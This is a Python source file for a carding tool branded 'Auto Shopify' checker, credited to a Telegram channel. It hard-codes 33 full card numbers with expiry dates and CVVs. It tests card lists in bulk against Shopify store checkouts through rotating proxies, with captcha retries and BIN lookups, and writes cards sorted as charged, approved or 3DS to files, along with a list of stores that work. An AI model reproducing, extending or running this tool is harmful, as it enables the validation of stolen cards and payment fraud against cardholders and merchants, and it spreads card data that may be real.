# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch
# patched: captcha retry in run_with_retry

import asyncio
import os
import sys
import aiohttp
import requests

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from api import process_card, parse_cc_string, extract_clean_response, fetch_products

TEST_CARDS = [
    "5275150060415544|05|27|803",
    "5275150094498722|06|28|271",
    "5597580170432727|02|29|669",
    "4890222002785710|08|29|313",
    "4147342094178599|10|27|885",
    "5275150165633736|11|29|675",
    "5143773871130026|05|26|705",
    "5275150182030312|08|29|950",
    "4031633018355571|06|28|951",
    "4064980980901258|12|30|252",
    "4060490108180441|07|27|597",
    "4019240129644962|12|26|434",
    "4031632382175870|06|28|166",
    "4031630843959817|11|29|534",
    "4386300000897744|09|28|933",
    "4522160009999007|05|27|547",
    "4342573011316291|03|26|197",
    "4232231190652704|04|29|831",
    "5275150044864536|01|29|779",
    "4917670019908882|11|29|380",
    "5296290500170740|08|30|887",
    "4737034040156359|08|27|890",
    "4430473070970562|10|26|333",
    "5275150085373975|05|30|322",
    "5275150355918699|05|30|547",
    "5275150170503874|10|29|222",
    "4693080245712985|06|26|430",
    "5731829501643875|08|31|954",
    "5425437707208757|06|29|752",
    "4031635456197985|05|28|854",
    "4669912628749442|12|31|554",
    "4141700008152347|06|29|871",
    "4117774007477849|03|28|104",
]

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
M = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'generic error', 'payments_credit_card_generic',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'no_variants', 'rate_limited',
    'merchandise_product_not_published_in_buyer_location',
    'merchandise_out_of_stock', 'faild_to_add_to_cart', 'waiting_pending_terms',
    'payments_credit_card_number_invalid_format', 'merchandise_expected_price_mismatch',
    'status: 429', 'site not supported', '429', 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED',
    'Failed to get session token'
]

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect'
]

RETRY_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail', 'generic_error', 'generic error',
    'ERROR', 'GENERIC_ERROR', 'PAYMENTS_CREDIT_CARD_GENERIC',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'NO_VARIANTS', 'RATE_LIMITED',
    'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
    'MERCHANDISE_OUT_OF_STOCK', 'FAILD_TO_ADD_TO_CART', 'WAITING_PENDING_TERMS',
    'SESSION TOKEN', 'MERCHANDISE_EXPECTED_PRICE_MISMATCH'
]

WORKING_SITES = set()


def save_site(site):
    if site not in WORKING_SITES:
        with open('sites.txt', 'a', encoding='utf-8') as f:
            f.write(f"{site}\n")
        WORKING_SITES.add(site)


def clr():
    os.system('cls' if os.name == 'nt' else 'clear')


def safe_input(prompt=''):
    try:
        return input(prompt)
    except EOFError:
        return ''


def banner():
    print(f"{C}  {W}{BOLD} ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗{RESET}")
    print(f"{C}  {W}{BOLD} ██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝{RESET}")
    print(f"{C}  {W}{BOLD} ███████╗███████║██║   ██║██████╔╝██║█████╗   ╚████╔╝ {RESET}")
    print(f"{C}  {W}{BOLD} ╚════██║██╔══██║██║   ██║██╔═══╝ ██║██╔══╝    ╚██╔╝  {RESET}")
    print(f"{C}  {W}{BOLD} ███████║██║  ██║╚██████╔╝██║     ██║██║        ██║   {RESET}")
    print(f"{C}  {W}{BOLD} ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝   {RESET}")
    print(f"            {C}Created by @Xoarch | @scriptdung{RESET}")
    print()


async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                bank = data.get('bank', 'UNKNOWN')
                country = data.get('country_name', 'UNKNOWN')
                brand = data.get('brand', 'UNKNOWN')
                level = data.get('level', 'N/A')
                type_cc = data.get('type', 'N/A')
                flag = data.get('country_flag', '')
                return brand, bank, country, level, type_cc, flag
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""


def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg:
        return 'charged'
    if 'otp_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip', 'incorrect_zip', 'invalid_cvv', 'invalid_cvc', 'insufficient_funds']):
        return 'approved'
    if success:
        return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg:
            return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS):
        return 'error'
    return 'error'


def is_captcha(message):
    msg = message.lower()
    return 'captcha_required' in msg or 'captcha required' in msg


async def run_with_retry(parts, site, proxy_str, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'

    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            last_success, last_msg, last_gate, last_price, last_cur = success, message, gateway, price, currency
            category = classify_result(success, message)

            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category

            if is_captcha(message):
                if attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                break

            if is_dead_site(message):
                break

            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            break

    return last_success, last_msg, last_gate, last_price, last_cur, 'error'


def approved_message(message):
    msg = message.lower()
    if 'insufficient' in msg:
        return 'INSUFFICIENT_FUNDS'
    elif 'invalid_cvv' in msg or ('cvv' in msg and 'invalid' in msg):
        return 'INVALID_CVV'
    elif 'invalid_cvc' in msg or ('cvc' in msg and 'invalid' in msg):
        return 'INVALID_CVC'
    elif 'incorrect_zip' in msg or 'zip' in msg:
        return 'INCORRECT_ZIP'
    elif 'cvv' in msg:
        return 'INVALID_CVV'
    elif 'cvc' in msg:
        return 'INVALID_CVC'
    else:
        clean = extract_clean_response(message)
        return clean.upper().replace(' ', '_')


def is_dead_site(message):
    msg = message.lower()
    for kw in DEAD_KEYWORDS:
        if kw in msg:
            return True
    return False


def fmt_price(price, currency):
    try:
        if not price or price == '0': return "Free"
        return f"${float(price):.2f} {currency}"
    except:
        return f"${price} {currency}"


def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"


async def print_result(session, cc_string, message, price, currency, category, charged_by=None, override_clean=None):
    cc = cc_string.split('|')[0] if '|' in cc_string else cc_string
    brand, bank, country, level, type_cc, flag = await get_bin_info(session, cc)

    clean = override_clean if override_clean else extract_clean_response(message)
    if 'MERCHANDISE_EXPECTED_PRICE_MISMATCH' in clean.upper():
        clean = 'Error'

    if category == 'charged':
        clean = 'ORDER_PLACED'
    elif category == 'tds':
        clean = 'OTP_REQUIRED'
    price_fmt = fmt_price(price, currency)
    info_str = fmt_info(brand, type_cc, level)

    if category == 'charged':
        status_disp = f"{G}{BOLD}𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥{RESET}"
    elif category == 'approved':
        status_disp = f"{B}{BOLD}𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅{RESET}"
    elif category == 'tds':
        status_disp = f"{Y}{BOLD}𝟑𝐃𝐒 ❎{RESET}"
    elif category == 'declined':
        status_disp = f"{R}{BOLD}𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝{RESET}"
    else:
        status_disp = f"{Y}{BOLD}𝐄𝐫𝐫𝐨𝐫{RESET}"

    print(f"\n{W}ア {C}𝐂𝐚𝐫𝐝 -» {W}{cc_string}{RESET}")
    print(f"{W}カ {C}𝙎𝙩𝙖𝙩𝙪𝙨 -» {status_disp}")
    print(f"{W}ツ {C}𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {W}{clean}{RESET}")
    print(f"{W}キ {C}𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {W}𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲{RESET}")
    print(f"{W}千 {C}𝐏𝐫𝐢𝐜𝐞 -» {W}{price_fmt}{RESET}")
    print(f"{C}━━━━━━━━━━━━━{RESET}")
    print(f"{W}零 {C}𝙄𝙣𝙛𝙤 -» {W}{info_str}{RESET}")
    print(f"{W}零 {C}𝘽𝙖𝙣𝙠 -» {W}{bank}{RESET}")
    print(f"{W}零 {C}𝘾𝙤𝙪𝗻𝘁𝗿𝐲 -» {W}{country} {flag}{RESET}")
    print(f"{C}━━━━━━━━━━━━━{RESET}")
    print(f"{W}力 {C}𝐃𝐞𝐯 -» {W}@Xoarch{RESET}")

    return clean, price_fmt, brand, bank, country, flag, info_str


def _write_block(filepath, cc_string, status_label, clean, price_fmt, info_str, bank, country, flag):
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"ア 𝐂𝐚𝐫𝐝 -» {cc_string}\n")
        f.write(f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status_label}\n")
        f.write(f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {clean}\n")
        f.write(f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n")
        f.write(f"千 𝐏𝐫𝐢𝐜𝐞 -» {price_fmt}\n")
        f.write(f"━━━━━━━━━━━━━\n")
        f.write(f"零 𝙄𝙣𝙛𝙤 -» {info_str}\n")
        f.write(f"零 𝘽𝙖𝙣𝙠 -» {bank}\n")
        f.write(f"零 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 -» {country} {flag}\n")
        f.write(f"━━━━━━━━━━━━━\n")
        f.write(f"力 𝐃𝐞𝐯 -» @Xoarch\n")


def save_3ds(cc_string, clean, price_fmt, info_str, bank, country, flag):
    _write_block('3ds.txt', cc_string, '𝟑𝐃𝐒 ❎', clean, price_fmt, info_str, bank, country, flag)


def save_approved(cc_string, clean, price_fmt, info_str, bank, country, flag):
    _write_block('approved.txt', cc_string, '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅', clean, price_fmt, info_str, bank, country, flag)


def save_charged(cc_string, clean, price_fmt, info_str, bank, country, flag):
    _write_block('charged.txt', cc_string, '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥', clean, price_fmt, info_str, bank, country, flag)


def parse_proxy_str(proxy_str, proxy_type):
    if not proxy_str: return None
    p = proxy_str.strip().replace(',', ':').replace(';', ':')
    scheme = {1: 'http', 2: 'socks4', 3: 'socks5'}.get(proxy_type, 'http')
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')): return p
    if '@' in p:
        auth, addr = p.split('@')
        return f"{scheme}://{auth}@{addr}"
    parts = p.split(':')
    if len(parts) == 2:
        return f"{scheme}://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        try:
            int(parts[1])
            return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        except:
            return f"{scheme}://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return f"{scheme}://{p}"


def proxy_menu():
    print(f"\n{C}Proxy Type:{RESET}")
    print(f" {W}[1]{RESET} HTTP/S")
    print(f" {W}[2]{RESET} SOCKS4")
    print(f" {W}[3]{RESET} SOCKS5")
    print(f" {W}[4]{RESET} PROXYLESS")
    choice = input(f"\n{C}Select: {RESET}").strip()
    return int(choice) if choice in ['1', '2', '3', '4'] else 4


def load_proxies(proxy_type):
    if proxy_type == 4:
        return []
    proxy_file = input(f"\n{C}Enter your proxy file: {RESET}").strip()
    if os.path.isfile(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    print(f"{R}Proxy file not found, running proxyless.{RESET}")
    return []


async def checker_single():
    clr()
    banner()
    cc_string = input(f"{C}Enter your cc: {RESET}").strip()
    site = input(f"{C}Enter your site: {RESET}").strip()
    if not site.startswith('http'):
        site = 'https://' + site

    clr()
    banner()
    print(f"{C}Checking...{RESET}")

    try:
        parts = parse_cc_string(cc_string)
    except ValueError as e:
        print(f"{R}Invalid format: {e}{RESET}")
        safe_input(f"\n{C}Press Enter...{RESET}")
        return

    async with aiohttp.ClientSession() as session:
        success, message, gateway, price, currency, category = await run_with_retry(parts, site, None)
        appr_clean = approved_message(message) if category == 'approved' else None
        clean, price_fmt, brand, bank, country, flag, info_str = await print_result(
            session, cc_string, message, price, currency, category, override_clean=appr_clean
        )
        if category == 'tds':
            save_3ds(cc_string, clean, price_fmt, info_str, bank, country, flag)
        elif category == 'approved':
            save_approved(cc_string, clean, price_fmt, info_str, bank, country, flag)
        elif category == 'charged':
            save_charged(cc_string, clean, price_fmt, info_str, bank, country, flag)

    safe_input(f"\n{C}Press Enter...{RESET}")


async def checker_mass():
    clr()
    banner()
    cc_file = input(f"{C}Enter your cc file: {RESET}").strip()
    site_input = input(f"{C}Enter your site (or site file): {RESET}").strip()
    proxy_type = proxy_menu()
    proxies = load_proxies(proxy_type)

    clr()
    banner()

    if not os.path.isfile(cc_file):
        print(f"{R}CC file not found.{RESET}")
        safe_input(f"\n{C}Press Enter...{RESET}")
        return

    with open(cc_file, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]

    if os.path.isfile(site_input):
        with open(site_input, 'r', encoding='utf-8') as f:
            sites_list = [line.strip() for line in f if line.strip()]
        site_is_file = True
    else:
        sites_list = [site_input]
        site_is_file = False

    sem = asyncio.Semaphore(15)
    print_lock = asyncio.Lock()

    async with aiohttp.ClientSession() as session:
        stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}

        async def handle_card(idx, cc_string):
            async with sem:
                site = sites_list[idx % len(sites_list)] if site_is_file else sites_list[0]
                if not site.startswith('http'):
                    site = 'https://' + site

                proxy_str = None
                if proxies:
                    proxy_str = parse_proxy_str(proxies[idx % len(proxies)], proxy_type)

                try:
                    parts = parse_cc_string(cc_string)
                except:
                    async with print_lock:
                        print(f"{Y}{cc_string} - Invalid Format{RESET}")
                    return

                success, message, gateway, price, currency, category = await run_with_retry(parts, site, proxy_str)

                if is_captcha(message) or is_dead_site(message):
                    if site_is_file and len(sites_list) > 1:
                        next_site = sites_list[(idx + 1) % len(sites_list)]
                        if not next_site.startswith('http'):
                            next_site = 'https://' + next_site
                        success, message, gateway, price, currency, category = await run_with_retry(parts, next_site, proxy_str)
                        site = next_site

                if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                    save_site(site)

                appr_clean = approved_message(message) if category == 'approved' else None
                clean = appr_clean if appr_clean else extract_clean_response(message)
                if 'MERCHANDISE_EXPECTED_PRICE_MISMATCH' in clean.upper():
                    clean = 'Error'
                if category == 'charged':
                    clean = 'ORDER_PLACED'
                elif category == 'tds':
                    clean = 'OTP_REQUIRED'

                async with print_lock:
                    stats[category] += 1
                    price_fmt = fmt_price(price, currency)
                    gate_disp = gateway if gateway else "Shopify Payments"
                    cc_clean = cc_string.replace('https://', '').strip()

                    if category == 'charged':
                        print(f"{G}{cc_clean} - 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥{RESET}")
                    elif category == 'approved':
                        print(f"{B}{cc_clean} - 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅{RESET}")
                    elif category == 'tds':
                        print(f"{Y}{cc_clean} - 𝟑𝐃𝐒 ❎{RESET}")
                    elif category == 'declined':
                        print(f"{R}{cc_clean} - 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝{RESET}")
                    else:
                        print(f"{Y}{cc_clean} - 𝐄𝐫𝐫𝐨𝐫{RESET}")

                if category in ('tds', 'approved', 'charged'):
                    cc = cc_string.split('|')[0]
                    brand, bank, country, level, type_cc, flag = await get_bin_info(session, cc)
                    price_fmt = fmt_price(price, currency)
                    info_str = fmt_info(brand, type_cc, level)
                    async with print_lock:
                        if category == 'tds':
                            save_3ds(cc_string, clean, price_fmt, info_str, bank, country, flag)
                        elif category == 'approved':
                            save_approved(cc_string, clean, price_fmt, info_str, bank, country, flag)
                        elif category == 'charged':
                            save_charged(cc_string, clean, price_fmt, info_str, bank, country, flag)

        tasks = [handle_card(i, cc) for i, cc in enumerate(cards)]
        await asyncio.gather(*tasks)

    print(f"\n{W}𝐂𝐀𝐑𝐃 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒{RESET}")
    print(f"{C}━━━━━━━━━━━━━━{RESET}")
    print(f"{W}𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {len(cards)}{RESET}")
    print(f"{W}𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬: {len(sites_list)}{RESET}")
    print(f"\n{G}𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']}{RESET}")
    print(f"{G}𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}{RESET}")
    print(f"{Y}𝟑𝐃𝐒: {stats['tds']}{RESET}")
    print(f"{R}𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}{RESET}")
    print(f"{Y}𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']}{RESET}")
    print(f"{C}━━━━━━━━━━━━━━{RESET}")
    print(f"{W}𝐃𝐞𝐯: @Xoarch{RESET}")

    safe_input(f"\n{C}Press Enter...{RESET}")


def checker_menu():
    while True:
        clr()
        banner()
        print(f" {C}[1]{RESET} SINGLE")
        print(f" {C}[2]{RESET} MASS")
        print(f" {C}[3]{RESET} BACK")
        choice = input(f"\n{C}Select: {RESET}").strip()
        if choice == '1':
            try:
                asyncio.run(checker_single())
            except (KeyboardInterrupt, Exception):
                pass
        elif choice == '2':
            try:
                asyncio.run(checker_mass())
            except (KeyboardInterrupt, Exception):
                pass
        elif choice == '3':
            break


async def site_single():
    clr()
    banner()
    site = input(f"{C}Enter your site: {RESET}").strip()
    if not site.startswith('http'):
        site = 'https://' + site

    clr()
    banner()
    print(f"{C}Checking site with test card...{RESET}\n")

    test_cc = TEST_CARDS[0]
    parts = parse_cc_string(test_cc)

    try:
        success, message, gateway, price, currency, category = await run_with_retry(parts, site, None)
        msg_lower = message.lower()

        if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
            print(f"{G}[+] {site}{RESET}")
            save_site(site)
        else:
            print(f"{R}[-] {site}{RESET}")
    except Exception:
        print(f"{R}[-] {site}{RESET}")

    safe_input(f"\n{C}Press Enter...{RESET}")


async def site_mass():
    clr()
    banner()
    site_file = input(f"{C}Enter your site file: {RESET}").strip()
    proxy_type = proxy_menu()
    proxies = load_proxies(proxy_type)

    clr()
    banner()

    if not os.path.isfile(site_file):
        print(f"{R}Site file not found.{RESET}")
        safe_input(f"\n{C}Press Enter...{RESET}")
        return

    with open(site_file, 'r', encoding='utf-8') as f:
        sites = [line.strip() for line in f if line.strip()]

    sem = asyncio.Semaphore(15)
    print_lock = asyncio.Lock()

    stats = {'working': 0, 'dead': 0}

    async def check_site(idx, site):
        async with sem:
            if not site.startswith('http'):
                site = 'https://' + site

            proxy_str = parse_proxy_str(proxies[idx % len(proxies)], proxy_type) if proxies else None
            test_cc = TEST_CARDS[idx % len(TEST_CARDS)]
            parts = parse_cc_string(test_cc)

            try:
                success, message, gateway, price, currency, category = await run_with_retry(parts, site, proxy_str)
                msg_lower = message.lower()

                async with print_lock:
                    if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
                        print(f"{G}[+] {site}{RESET}")
                        save_site(site)
                        stats['working'] += 1
                    else:
                        print(f"{R}[-] {site}{RESET}")
                        stats['dead'] += 1
            except Exception:
                async with print_lock:
                    print(f"{R}[-] {site}{RESET}")
                    stats['dead'] += 1

    tasks = [check_site(i, s) for i, s in enumerate(sites)]
    await asyncio.gather(*tasks)

    print(f"\n{W}𝐒𝐈𝐓𝐄 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒{RESET}")
    print(f"{C}━━━━━━━━━━━━━━{RESET}")
    print(f"{W}𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬: {len(sites)}{RESET}")
    print(f"\n{G}𝐖𝐨𝐫𝐤𝐢𝐧𝐠: {stats['working']}{RESET}")
    print(f"{R}𝐃𝐞𝐚𝐝: {stats['dead']}{RESET}")
    print(f"{C}━━━━━━━━━━━━━━{RESET}")
    print(f"{W}𝐃𝐞𝐯: @Xoarch{RESET}")

    safe_input(f"\n{C}Press Enter...{RESET}")


def site_menu():
    while True:
        clr()
        banner()
        print(f" {C}[1]{RESET} SINGLE")
        print(f" {C}[2]{RESET} MASS")
        print(f" {C}[3]{RESET} BACK")
        choice = input(f"\n{C}Select: {RESET}").strip()
        if choice == '1':
            try:
                asyncio.run(site_single())
            except (KeyboardInterrupt, Exception):
                pass
        elif choice == '2':
            try:
                asyncio.run(site_mass())
            except (KeyboardInterrupt, Exception):
                pass
        elif choice == '3':
            break


def main():
    clr()
    banner()
    while True:
        print(f" {C}[1]{RESET} CHECKER")
        print(f" {C}[2]{RESET} SITE")
        print(f" {C}[3]{RESET} EXIT\n")
        choice = input(f"{C}Select: {RESET}").strip()
        if choice == '1':
            checker_menu()
        elif choice == '2':
            site_menu()
        elif choice == '3':
            clr()
            print(f"\n{C}[ {W}Exited{C} ]{RESET}\n")
            sys.exit(0)
        clr()
        banner()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C}[ {W}Exited{C} ]{RESET}\n")
        sys.exit(0)